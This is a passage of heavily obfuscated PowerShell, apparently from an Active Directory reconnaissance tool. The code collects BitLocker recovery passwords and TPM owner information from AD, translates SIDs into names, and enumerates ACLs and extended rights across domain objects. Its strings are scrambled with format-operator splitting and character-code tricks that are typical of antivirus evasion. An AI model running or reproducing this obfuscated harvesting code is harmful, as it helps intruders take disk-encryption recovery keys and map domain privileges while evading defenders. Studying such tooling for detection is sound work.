            Write-Warning ("{3}{7}{9}{5}{1}{0}{2}{11}{4}{6}{10}{8}"-f 'g','Error while enumeratin',' m','[Get','y',' ','I','-ADRBitL','ation Objects','ocker]','nform','sFVE-Recover')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}"-f 'se','dispo').Invoke()

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $( $S07D::("{2}{1}{0}" -f'ctCount','je','Ob').Invoke($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('['+'*] '+'T'+'otal '+'B'+'itL'+'ocke'+'r '+'Recover'+'y'+' '+'K'+'e'+'ys: '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    
                    $Obj = New-Object ("{1}{0}"-f 'bject','PSO')
                    $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'No','teP','roperty') -Name ("{1}{4}{2}{3}{0}"-f'ed Name','Dis','guis','h','tin') -Value $((($_."prO`PE`RtieS"."D`ISTiNgUIshe`d`Name" -split '}')[1]).("{0}{1}{2}" -f'sub','str','ing').Invoke(1))
                    $Obj | Add-Member -MemberType ("{0}{1}{2}" -f 'NotePro','pert','y') -Name ("{1}{0}" -f'me','Na') -Value ([string] ($_."pRo`pe`RtiES"."N`AME"))
                    $Obj | Add-Member -MemberType ("{0}{2}{1}" -f 'Not','rty','ePrope') -Name ("{3}{1}{2}{0}"-f'd','Creat','e','when') -Value ([DateTime] $($_."p`RopeR`Ties"."wH`Encr`EaT`eD"))
                    $Obj | Add-Member -MemberType ("{1}{0}{2}" -f 'oteProp','N','erty') -Name ("{3}{4}{2}{1}{0}" -f 'D',' I','y Key','Re','cover') -Value $([GUID] $_."pRo`PertI`es".'msfve-recoveryguid'[0])
                    $Obj | Add-Member -MemberType ("{0}{3}{2}{1}" -f'NotePr','y','pert','o') -Name ("{0}{3}{2}{1}" -f'R','ry Key','ve','eco') -Value ([string] ($_."PROpe`R`TiES".'msfve-recoverypassword'))
                    $Obj | Add-Member -MemberType ("{2}{0}{1}"-f'ropert','y','NoteP') -Name ("{3}{0}{2}{1}"-f'ol','e GUID','um','V') -Value $([GUID] $_."PropER`Ti`Es".'msfve-volumeguid'[0])

                    $objSearcher = New-Object ("{4}{5}{7}{0}{2}{6}{3}{1}" -f 'ervices.Dir','r','e','torySearche','System.Direct','or','c','yS') $objDomain
                    $ObjSearcher."PAgE`Si`ze" = $PageSize
                    $ObjSearcher."fIL`TEr" = "(&(samAccountType=805306369)(distinguishedName=$($Obj.'Distinguished Name'))) "
                    $ObjSearcher."PR`OP`ER`TiEsTOLOad".("{1}{2}{0}"-f'e','Ad','dRang').Invoke((("{1}{5}{2}{6}{4}{0}{3}"-f'o','mst','wner','n','ormati','pm-o','inf'),("{0}{3}{5}{4}{1}{2}" -f 'mst','forcompu','ter','pm','information','-tpm')))
                    $ObjSearcher."SeAR`ch`sC`oPE" = ("{0}{1}" -f 'Sub','tree')

                    Try
                    {
                        $TempComp = $ObjSearcher.("{0}{1}{2}"-f'Fi','ndAl','l').Invoke()
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    $ObjSearcher.("{1}{2}{0}" -f'se','dis','po').Invoke()

                    If ($TempComp)
                    {
                        
                        $Obj | Add-Member -MemberType ("{2}{1}{0}"-f 'rty','otePrope','N') -Name ("{3}{4}{1}{0}{5}{2}"-f 'Ow','PM-','nformation','m','sT','nerI') -Value $([string] $TempComp."Pr`OpeRT`iEs".'mstpm-ownerinformation')

                        
                        $Obj | Add-Member -MemberType ("{1}{2}{0}" -f'roperty','Note','P') -Name ("{2}{7}{3}{8}{6}{1}{0}{4}{5}" -f 'i','mat','ms','PM','onFo','rComputer','Infor','T','-Tpm') -Value $([string] $TempComp."ProP`ERti`eS".'mstpm-tpminformationforcomputer')
                        If ($null -ne $TempComp."p`R`OPErTIES".'mstpm-tpminformationforcomputer')
                        {
                            
                            If ($Credential -ne   ( vAriabLe ('K'+'49p')).Value::"Em`ptY")
                            {
                                $objSearchPath = New-Object ("{1}{5}{7}{3}{4}{2}{6}{0}"-f 'ry','Syst','s.Di','ctory','Service','e','rectoryEnt','m.Dire') "LDAP://$($DomainController)/$($TempComp.Properties.'mstpm-tpminformationforcomputer')", $Credential."uSERn`Ame",$Credential.("{1}{3}{2}{0}{4}" -f'rede','G','C','etNetwork','ntial').Invoke()."pASS`WoRD"
                                $objSearcherPath = New-Object ("{5}{3}{4}{1}{6}{0}{2}{7}"-f'orySea','ices.','rche','irect','oryServ','System.D','Direct','r') $objSearchPath
                                $objSearcherPath."p`ROPERTiE`st`ol`OAd".("{1}{2}{0}"-f'e','Add','Rang').Invoke((("{6}{5}{2}{0}{1}{4}{3}"-f'erinfor','ma','n','on','ti','-ow','mstpm')))
                                Try
                                {
                                    $TPMObject = $objSearcherPath.("{0}{1}" -f'Fi','ndAll').Invoke()
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                $objSearcherPath.("{1}{0}" -f'e','dispos').Invoke()

                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject."pRoPeRt`I`ES".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                            Else
                            {
                                Try
                                {
                                    $TPMObject = ([ADSI]"LDAP://$($TempComp.Properties.'mstpm-tpminformationforcomputer')")
                                }
                                Catch
                                {
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($TPMObject)
                                {
                                    $TPMRecoveryInfo = $([string] $TPMObject."P`R`oPERT`Ies".'mstpm-ownerinformation')
                                }
                                Else
                                {
                                    $TPMRecoveryInfo = $null
                                }
                            }
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType ("{1}{0}{2}{3}"-f 'eP','Not','rop','erty') -Name ("{0}{3}{5}{4}{2}{1}"-f 'msT','on','ormati','P','wnerInf','M-O') -Value $null
                        $Obj | Add-Member -MemberType ("{2}{1}{0}" -f'rty','rope','NoteP') -Name ("{6}{2}{7}{8}{3}{0}{4}{5}{1}"-f 'i','ter','PM-','mat','o','nForCompu','msT','TpmI','nfor') -Value $null
                        $TPMRecoveryInfo = $null
                    }
                    $Obj | Add-Member -MemberType ("{2}{1}{0}{3}"-f'o','r','NoteP','perty') -Name ("{5}{1}{3}{2}{4}{0}"-f 'Password','M','O',' ','wner ','TP') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ("{1}{0}"-f'nt','c')
            Remove-Variable ("{0}{2}{5}{3}{4}{1}" -f'AD','ryKeys','B','tLo','ckerRecove','i')
        }
    }

    If ($BitLockerObj)
    {
        Return $BitLockerObj
    }
    Else
    {
        Return $null
    }
}


Function cO`NVeR`T`FrO`M-SId
{

    Param(
        [Parameter(mANdatOry = $true)]
        [string] $Method,

        [Parameter(maNdatoRY = $true)]
        [Alias('SID')]
        
        [String]
        $ObjectSid,

        [Parameter(MaNdatoRy = $false)]
        [string] $DomainFQDN,

        [Parameter(MandAToRY = $false)]
        [Management.Automation.PSCredential] $Credential =   $K49p::"EM`ptY",

        [Parameter(mAnDatory = $false)]
        [bool] $ResolveSID = $false
    )

    BEGIN {
        
        
        $ADS_NAME_INITTYPE_DOMAIN   = 1 
        
        $ADS_NAME_INITTYPE_GC       = 3 

        
        
        
        
        $ADS_NAME_TYPE_NT4                      = 3 
        
        
        
        
        $ADS_NAME_TYPE_UNKNOWN                  = 8 
        
        
        
        

        
        
        
        
        $ADS_CHASE_REFERRALS_ALWAYS      = (0x60) 
    }

    PROCESS {
        $TargetSid = $($ObjectSid.("{2}{0}{1}" -f'r','imStart','T').Invoke("O:"))
        $TargetSid = $($TargetSid.("{1}{0}" -f'im','Tr').Invoke('*'))
        If ($TargetSid -match ("{0}{2}{1}"-f'^S-','.*','1-'))
        {
            Try
            {
                
                Switch ($TargetSid) {
                    ("{0}{1}"-f'S','-1-0')         { ("{0}{2}{1}" -f'Nu','thority','ll Au') }
                    ("{0}{1}{2}" -f'S-','1-','0-0')       { ("{1}{0}" -f 'body','No') }
                    ("{1}{0}" -f '-1-1','S')         { ("{1}{2}{3}{0}" -f'ority','Worl','d A','uth') }
                    ("{1}{2}{0}"-f '1-0','S-1','-')       { ("{0}{2}{1}" -f'Every','ne','o') }
                    ("{1}{0}" -f '-2','S-1')         { ("{4}{1}{2}{3}{0}"-f 'ty',' Au','th','ori','Local') }
                    ("{2}{1}{0}" -f '-0','2','S-1-')       { ("{1}{0}" -f'al','Loc') }
                    ("{0}{1}"-f'S-1-2-','1')       { ("{2}{1}{0}"-f 'ogon ','nsole L','Co') }
                    ("{1}{0}"-f '-1-3','S')         { ("{4}{0}{1}{2}{3}" -f 'r',' Aut','horit','y','Creato') }
                    ("{1}{0}{2}"-f'-','S-1','3-0')       { ("{4}{3}{1}{0}{2}"-f'Own','tor ','er','rea','C') }
                    ("{1}{0}{2}"-f'-1-','S','3-1')       { ("{1}{0}{2}{3}" -f'reator Gro','C','u','p') }
                    ("{0}{1}"-f 'S-1','-3-2')       { ("{2}{1}{0}{3}"-f' Ser','ator Owner','Cre','ver') }
                    ("{2}{0}{1}" -f'-1-3-','3','S')       { ("{1}{2}{0}{3}" -f 'roup Serve','Creat','or G','r') }
                    ("{0}{1}{2}" -f'S','-','1-3-4')       { ("{1}{2}{3}{0}" -f'Rights','Owne','r',' ') }
                    ("{1}{0}" -f '-4','S-1')         { ("{2}{0}{4}{1}{3}" -f'utho','i','Non-unique A','ty','r') }
                    ("{1}{0}" -f '5','S-1-')         { ("{1}{2}{0}" -f 'ity','NT',' Author') }
                    ("{0}{1}" -f'S-1','-5-1')       { ("{0}{1}" -f 'Dial','up') }
                    ("{2}{1}{0}" -f '2','-','S-1-5')       { ("{0}{1}{2}"-f 'Net','w','ork') }
                    ("{1}{0}" -f'5-3','S-1-')       { ("{1}{0}" -f'tch','Ba') }
                    ("{0}{1}"-f'S','-1-5-4')       { ("{0}{1}{2}" -f 'In','ter','active') }
                    ("{2}{0}{1}" -f'1','-5-6','S-')       { ("{0}{2}{1}" -f 'Se','ce','rvi') }
                    ("{2}{1}{0}" -f '-7','1-5','S-')       { ("{2}{0}{1}" -f'mo','us','Anony') }
                    ("{0}{1}" -f'S-1-5-','8')       { ("{0}{1}" -f'Pr','oxy') }
                    ("{1}{0}"-f'-5-9','S-1')       { ("{0}{5}{4}{1}{3}{2}" -f 'En','n Control','rs','le','se Domai','terpri') }
                    ("{1}{0}" -f '0','S-1-5-1')      { ("{2}{1}{0}"-f'elf','pal S','Princi') }
                    ("{1}{0}" -f'-5-11','S-1')      { ("{1}{3}{0}{2}" -f'r','Authen','s','ticated Use') }
                    ("{0}{2}{1}" -f 'S-1-','12','5-')      { ("{0}{1}{2}{3}"-f 'Res','t','ricted Cod','e') }
                    ("{0}{2}{1}"-f 'S-','5-13','1-')      { ("{2}{4}{5}{3}{1}{0}"-f' Users','erver','T',' S','ermina','l') }
                    ("{2}{0}{1}" -f'5-','14','S-1-')      { ("{3}{4}{5}{2}{1}{0}"-f'n','ive Logo','nteract','Rem','ote ','I') }
                    ("{1}{2}{0}"-f '-15','S','-1-5')      { ("{1}{0}{2}{3}"-f'his ','T','Org','anization ') }
                    ("{1}{2}{0}"-f'1-5-17','S','-')      { ("{4}{0}{2}{3}{1}{5}" -f' Or','atio','g','aniz','This','n ') }
                    ("{2}{0}{1}"-f'-1-5-','18','S')      { ("{1}{0}{2}"-f'ocal Sys','L','tem') }
                    ("{1}{0}{2}"-f'-5-','S-1','19')      { ("{2}{1}{0}" -f'y','t','NT Authori') }
                    ("{2}{0}{1}"-f '-2','0','S-1-5')      { ("{1}{2}{0}" -f'y','NT Auth','orit') }
                    ("{2}{0}{1}"-f '1-5-80-','0','S-')    { ("{1}{0}{3}{2}" -f 'l ','Al','s ','Service') }
                    ("{1}{2}{0}"-f'544','S-1-5-3','2-')  { ((("{0}{4}{1}{3}{2}" -f 'BU','TVUAdmi','ors','nistrat','ILTIN'))  -rEPlace ([char]84+[char]86+[char]85),[char]92) }
                    ("{0}{1}{2}" -f'S-1-5-32','-','545')  { ((("{0}{2}{3}{1}"-f'BUI','s','LTINd3fU','ser'))-CrEPLace  ([chaR]100+[chaR]51+[chaR]102),[chaR]92) }
                    ("{3}{0}{1}{2}" -f'5-','32-54','6','S-1-')  { ((("{1}{2}{0}" -f'qrGuests','B','UILTINR')).("{0}{2}{1}"-f 'REpL','e','ac').Invoke('Rqr','\')) }
                    ("{0}{2}{1}{3}"-f'S-1-5','4','-32-5','7')  { ((("{3}{4}{1}{0}{2}" -f 'er Us','LTINrdbPow','ers','BU','I')) -ReplACE([cHAR]114+[cHAR]100+[cHAR]98),[cHAR]92) }
                    ("{0}{2}{1}{3}"-f'S-1-5-','2-54','3','8')  { ((("{3}{2}{0}{6}{4}{5}{1}" -f'IN','perators','T','BUIL','}A','ccount O','{0')) -F[CHAR]92) }
                    ("{2}{1}{0}" -f '-549','32','S-1-5-')  { ((("{6}{3}{2}{4}{0}{1}{5}"-f'p','era','rver ','0}Se','O','tors','BUILTIN{')) -f[cHAr]92) }
                    ("{1}{2}{0}" -f'-32-550','S-','1-5')  { ((("{3}{1}{2}{0}"-f 'Operators','UILTIN{0}P','rint ','B'))  -F [ChAR]92) }
                    ("{1}{0}{3}{2}" -f'5-','S-1-','-551','32')  { ((("{5}{3}{6}{4}{1}{2}{0}" -f 'tors','Ope','ra','I',' ','BU','LTIN4svBackup')) -rEPlAcE([cHAR]52+[cHAR]115+[cHAR]118),[cHAR]92) }
                    ("{0}{2}{1}{3}" -f 'S','32-55','-1-5-','2')  { ((("{4}{0}{1}{2}{5}{6}{3}"-f'NlpCR','e','p','ors','BUILTI','li','cat')) -crepLAcE ([CHAR]108+[CHAR]112+[CHAR]67),[CHAR]92) }
                    ("{0}{2}{1}" -f 'S-','-554','1-5-32')  { ((("{7}{8}{0}{5}{6}{9}{3}{1}{2}{4}"-f 'I','s 2000 ','Compatible A','dow','ccess','LTIN4Ao','Pre','B','U','-Win')) -crEPLaCe([Char]52+[Char]65+[Char]111),[Char]92) }
                    ("{2}{1}{0}"-f '-32-555','-5','S-1')  { ((("{0}{3}{1}{4}{2}{5}"-f 'BUIL','91R','te Desktop Use','TIN3','emo','rs')).("{1}{0}{2}"-f 'epl','R','aCE').Invoke('391','\')) }
                    ("{0}{2}{1}{3}" -f'S','32-55','-1-5-','6')  { ((("{7}{2}{0}{5}{4}{6}{1}{3}" -f 'on','n ','work C','Operators','igu','f','ratio','BUILTIN{0}Net'))-f[cHar]92) }
                    ("{1}{0}{3}{2}" -f'1-5-3','S-','57','2-5')  { ((("{0}{3}{2}{8}{6}{4}{1}{7}{5}" -f'BUILTIN','ust','re','cFYIncoming Fo','r','s','t T',' Builder','s')) -rePlacE ([chAR]99+[chAR]70+[chAR]89),[chAR]92) }
                    ("{1}{0}{3}{2}"-f'-1-5-3','S','58','2-5')  { ((("{3}{1}{8}{2}{5}{4}{7}{0}{6}" -f'e','NJ7sPer','o','BUILTI','r U','rmance Monito','rs','s','f'))  -repLaCE  'J7s',[cHAR]92) }
                    ("{3}{0}{1}{2}" -f '-','5-32','-559','S-1')  { ((("{4}{2}{6}{0}{5}{1}{3}"-f 'erf','og','LTINEGU',' Users','BUI','ormance L','P')) -crePlacE  'EGU',[chAr]92) }
                    ("{0}{1}{2}"-f 'S-','1-5-3','2-560')  { ((("{2}{5}{4}{6}{3}{0}{1}" -f'n Access Grou','p','BUILTINsan','uthorizatio','dow','Win','s A')) -cReplaCe 'san',[CHar]92) }
                    ("{2}{3}{0}{1}"-f '1','-5-32-561','S','-')  { ((("{1}{5}{6}{3}{0}{2}{7}{4}"-f 'rver','BUILTI',' ','Se','rs','NB23Terminal',' ','License Serve')).("{1}{0}"-f'EplACE','r').Invoke('B23','\')) }
                    ("{3}{0}{1}{2}"-f '-','5-32-56','2','S-1')  { ((("{2}{0}{1}{4}{5}{3}{6}{7}" -f '0Dis','t','BUILTINCB','M U','ri','buted CO','ser','s')).("{0}{1}"-f 'rEP','lACE').Invoke('CB0','\')) }
                    ("{1}{0}{2}" -f '56','S-1-5-32-','9')  { ((("{1}{3}{2}{4}{5}{0}{6}"-f 'raphic ','BUI','INT','LT','8sCrypto','g','Operators'))."R`EPlAcE"('T8s',[StrIng][CHAr]92)) }
                    ("{1}{0}{2}" -f '2','S-1-5-3','-573')  { ((("{1}{3}{4}{2}{5}{0}" -f' Readers','BUILTI','t Lo','NzCZEv','en','g'))."rEP`L`ACE"(([chaR]122+[chaR]67+[chaR]90),[STriNg][chaR]92)) }
                    ("{3}{1}{0}{2}"-f '2-57','5-3','4','S-1-')  { ((("{12}{3}{8}{9}{7}{5}{2}{6}{10}{1}{4}{0}{11}" -f' A','DC','te','ILTIN7','OM','ca',' Serv','Certifi','T','q','ice ','ccess','BU')) -cREPlaCE ([chaR]55+[chaR]84+[chaR]113),[chaR]92) }
                    ("{1}{0}{3}{2}" -f'-5','S-1-5-32','5','7')  { ((("{3}{4}{2}{0}{5}{6}{7}{1}" -f' ','s Servers','S','BUILTI','NUdrRD','Re','mote Ac','ces')).("{2}{1}{0}"-f 'E','lAc','REp').Invoke('Udr','\')) }
                    ("{2}{1}{0}{3}"-f'3','5-','S-1-','2-576')  { ((("{4}{6}{1}{7}{2}{5}{8}{0}{3}" -f'r','DS E','in','s','BUILTINZ','t S','spR','ndpo','erve'))."r`E`pLace"(([Char]90+[Char]115+[Char]112),[StRinG][Char]92)) }
                    ("{2}{1}{3}{0}" -f '7','3','S-1-5-','2-57')  { ((("{0}{5}{4}{1}{3}{2}" -f'B','anagement Serve','s','r','LTIN{0}RDS M','UI'))-f[chAR]92) }
                    ("{2}{3}{0}{1}"-f'57','8','S-1-5-32','-')  { ((("{4}{2}{3}{1}{0}" -f 's','r','ILTINVWMHyp','er-V Administrato','BU')) -rEpLACe ([cHAr]86+[cHAr]87+[cHAr]77),[cHAr]92) }
                    ("{1}{0}{3}{2}"-f '-','S-1','-579','5-32')  { ((("{8}{0}{2}{5}{1}{6}{7}{4}{3}"-f 'ipSAcc','t','ess Co','rs','tance Operato','n','rol Ass','is','BUILTIN')).("{0}{1}{2}"-f 'Repla','C','e').Invoke('ipS','\')) }
                    ("{3}{0}{1}{2}"-f '-','32-58','0','S-1-5')  { ((("{4}{6}{2}{5}{1}{3}{0}" -f'rs','s','Manage','e','BUIL','ment U','TINM0wRemote '))."rE`plaCE"(([cHar]77+[cHar]48+[cHar]119),'\')) }
                    ("{1}{0}"-f 'lt','Defau') {
                        
                        If ( ($TargetSid -match ("{2}{1}{0}" -f '*','.','^S-1-')) -and ($ResolveSID) )
                        {
                            If ($Method -eq ("{0}{1}" -f 'AD','WS'))
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter ('o'+'bjectSi'+'d '+'-eq'+' '+"'$TargetSid'") -Properties ("{3}{1}{0}{2}{4}"-f 'guishedN','in','a','Dist','me'),("{0}{3}{1}{4}{2}" -f'sAM','ountNa','e','Acc','m')
                                }
                                Catch
                                {
                                    Write-Warning ("{11}{1}{0}{10}{7}{8}{9}{12}{6}{4}{2}{5}{3}" -f'tF','ver','ng Object us','ID','numerati','ing S',' Error while e','m-S','I','D','ro','[Con',']')
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject."d`IsTInGUIsh`Edna`ME"
                                    $ADSOutput = $UserDomain + "\" + $ADObject."sA`mAc`coUntNA`ME"
                                    Remove-Variable ("{1}{2}{0}"-f'n','U','serDomai')
                                }
                            }

                            If ($Method -eq ("{0}{1}" -f 'L','DAP'))
                            {
                                If ($Credential -ne   ( vARiabLe  K49p ).valUe::"EMp`TY")
                                {
                                    $ADObject = New-Object ("{5}{4}{7}{2}{1}{3}{6}{0}" -f'ry','.Di','ices','re','ctory','System.Dire','ctoryEnt','Serv')("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.("{3}{2}{0}{1}{4}{5}"-f'tNetworkC','rede','e','G','ntia','l').Invoke())."Us`Er`NAME",($Credential.("{0}{3}{1}{2}" -f 'GetNetworkC','t','ial','reden').Invoke())."p`ASsw`oRD")
                                }
                                Else
                                {
                                    $ADObject = New-Object ("{0}{3}{1}{5}{6}{4}{2}" -f'System','ec','yEntry','.Dir','tor','toryS','ervices.Direc')("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ( (  gI VARIABLE:LPXSiU  ).vaLUE::("{2}{0}{1}{3}"-f'l','lOrEm','IsNu','pty').Invoke($ADObject."Pro`P`ert`IeS"."S`A`ma`CcoUnt`NamE")) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject."pr`OP`ERt`ieS"."dIStINGU`I`ShE`DnAme"))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject."pROper`TI`eS"."SA`mA`c`Count`NaME"))
                                        Remove-Variable ("{1}{0}{2}"-f'rDom','Use','ain')
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ( (  gi  VaRiAbLe:LPXSIU).valuE::("{1}{2}{3}{0}" -f 'mpty','IsNullO','r','E').Invoke($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject ("{1}{0}{4}{2}{3}"-f'ameTrans','N','at','e','l')
                                If ($Credential -ne   $K49P::"EmP`TY")
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                         $pXYO1.("{1}{0}{3}{2}" -f'o','Inv','mber','keMe').Invoke(("{0}{1}{2}"-f 'Ini','tE','x'),("{2}{0}{1}{3}" -f 'o','keMe','Inv','thod'),$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.("{1}{3}{2}{0}" -f'tial','GetNetworkCre','n','de').Invoke())."US`erNAme",$DomainFQDN,($Credential.("{4}{3}{1}{0}{2}"-f'de','NetworkCre','ntial','et','G').Invoke())."p`A`ssWOrd")))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        
                                        
                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                         (  get-VAriaBle pXyo1  -VALUe ).("{3}{0}{1}{2}"-f'e','mb','er','InvokeM').Invoke(("{1}{0}" -f 't','Ini'),("{2}{1}{3}{0}" -f'thod','nvoke','I','Me'),$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        
                                        
                                    }
                                }
                                If ($Init)
                                {
                                      (Item  vaRIAbLE:PxyO1).vaLue.("{1}{0}{2}" -f 'okeM','Inv','ember').Invoke(("{0}{2}{1}"-f'ChaseRe','ral','fer'),("{2}{0}{1}" -f'tPro','perty','Se'),$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                          (  GeT-VARiaBLe  ('Pxyo'+'1') -valUeo  ).("{3}{2}{0}{1}"-f 'e','r','emb','InvokeM').Invoke("Set",("{3}{0}{1}{2}"-f'n','vo','keMethod','I'),$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput =   (  ITem VAriaBlE:pXYo1).VaLUE.("{1}{2}{0}"-f'keMember','Inv','o').Invoke("Get",("{1}{2}{3}{0}" -f'd','Inv','okeMe','tho'),$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {
                                        
                                        
                                    }
                                }
                            }
                        }
                        If (-Not ( ( ls ('v'+'a'+'rI'+'AblE:lpXSiU')).vALUE::("{0}{1}{3}{2}" -f 'I','sNullO','pty','rEm').Invoke($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {
                
                
            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}


Function GE`T`-A`dRAcL
{

    param(
        [Parameter(MandAtORy = $true)]
        [string] $Method,

        [Parameter(mANDatOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MANdAtorY = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential =   $K49P::"Em`pty",

        [Parameter(MAnDaToRy = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(MAnDatorY = $true)]
        [int] $PageSize,

        [Parameter(MANDAtORy = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}" -f 'DWS','A'))
    {
        If ($Credential -eq   (  gEt-VaRIABLE K49P  -valuEOnly)::"eM`PtY")
        {
            If (Test-Path ("{0}{1}"-f 'AD',':'))
            {
                Set-Location ("{1}{0}" -f'D:','A')
            }
            Else
            {
                Write-Warning ("{10}{8}{9}{6}{7}{4}{2}{0}{12}{13}{14}{11}{1}{5}{3}" -f 'ound ...','L enume','ot f','ation','n','r','rive',' ','ef','ault AD d','D','C',' Ski','p','ping A')
                Return $null
            }
        }
        $GUIDs = @{("{2}{6}{0}{3}{4}{5}{1}"-f'00-0000-','0000','00000000-','000','0-00000','000','00') = 'All'}
        Try
        {
            Write-Verbose ("{0}{5}{1}{2}{3}{4}{6}" -f '[*] E','e','r','ating sc','hemaI','num','Ds')
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE)."ScHE`MaN`AMI`NgcONt`e`xt" -LDAPFilter (("{3}{1}{0}{2}" -f'GUID=','emaID','*)','(sch')) -Properties ("{0}{1}"-f'nam','e'), ("{2}{3}{1}{0}" -f'GUID','D','schema','I')
        }
        Catch
        {
            Write-Warning ("{6}{5}{4}{0}{7}{3}{1}{2}"-f'h','I','Ds','ing schema','rror w','et-ADRACL] E','[G','ile enumerat')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object ("{1}{0}"-f 'd','Gui') (,$_."SCH`EmAIDg`Uid"))."gU`iD"] = $_."nA`me"
            }
            Remove-Variable ("{0}{1}" -f's','chemaIDs')
        }

        Try
        {
            Write-Verbose ("{4}{0}{1}{9}{2}{7}{8}{3}{6}{5}" -f 'Ac','ti',' Dire','h','[*] Enumerating ','s','t','ctory Ri','g','ve')
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{0}{2}{5}{6}{4}{8}{1}{7}{3}"-f '(objectClass=','essRig','c',')','lA','o','ntro','ht','cc') -Properties ("{1}{0}" -f 'e','nam'), ("{2}{0}{1}" -f'ights','GUID','r')
        }
        Catch
        {
            Write-Warning ("{8}{0}{9}{13}{11}{4}{3}{6}{16}{10}{5}{14}{7}{2}{1}{12}{15}" -f'L]','ive','g Act','i','wh','t','le ','n','[Get-ADRAC',' E','a','ror ',' Directo','r','i','ry Rights','enumer')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object ("{0}{1}" -f'Gu','id') (,$_."r`igHTsG`Uid"))."g`UiD"] = $_."NA`me"
            }
            Remove-Variable ("{2}{1}{0}" -f'IDs','ema','sch')
        }

        
        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{4}{0}{8}{3}{2}{6}{5}{7}{1}" -f'Get-ADRAC','ntext','Error',' ','[','a',' getting Dom','in Co','L]')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            Write-Verbose ("{11}{4}{1}{9}{2}{10}{5}{6}{7}{8}{0}{3}" -f'ect','umerati','main, OU, GPO, Us','s','] En',', Co','m','puter and Group ','Obj','ng Do','er','[*')
            $Objs += Get-ADObject -LDAPFilter ((("{17}{36}{42}{28}{2}{11}{7}{27}{15}{53}{65}{21}{38}{34}{32}{26}{48}{16}{62}{14}{18}{44}{24}{4}{19}{22}{31}{43}{20}{56}{54}{41}{10}{40}{5}{35}{63}{59}{29}{37}{50}{12}{13}{58}{0}{46}{8}{61}{52}{23}{39}{51}{60}{64}{33}{47}{25}{30}{45}{49}{1}{6}{3}{55}{9}{57}"-f'a','tt','lass=dom','e','oupPoli','69','yp','in)(o','u','68','p','a','43545','6)','it)(objec','je','tion','({0}(o','tC','cyCon','mAccountType=8053063','ate','tainer','ype=26843','ory=gr','e=536','aniz','b','ctC','ttyp','8',')(','g','cco','or',')(','bj','e=2','gory=','5','e=8053063','tTy','e','sa','ateg','70','cco','unttyp','a','912)(samaccoun','68','457)(','tt','ct','coun','=53','68)(samAc','70913))','(sam','ccoun','sam','n','alun','sama','a','C'))-f [CHaR]124) -Properties ("{0}{1}{2}" -f'Di','splayN','ame'), ("{2}{0}{3}{4}{1}"-f'ngu','e','Disti','ishedN','am'), ("{1}{0}"-f 'ame','N'), ("{3}{2}{4}{0}{1}"-f 'de','scriptor','c','ntse','urity'), ("{3}{0}{2}{1}" -f'ct','ss','Cla','Obje'), ("{0}{1}{2}{3}" -f 'obj','ec','ts','id')
        }
        Catch
        {
            Write-Warning ("{10}{11}{4}{8}{0}{6}{13}{1}{9}{3}{2}{12}{5}{7}" -f'e enumerating Domain, ',', ','te','ser, Compu','ADRACL] Error whi','and Group','OU,',' Objects','l','U','[G','et-','r ',' GPO')
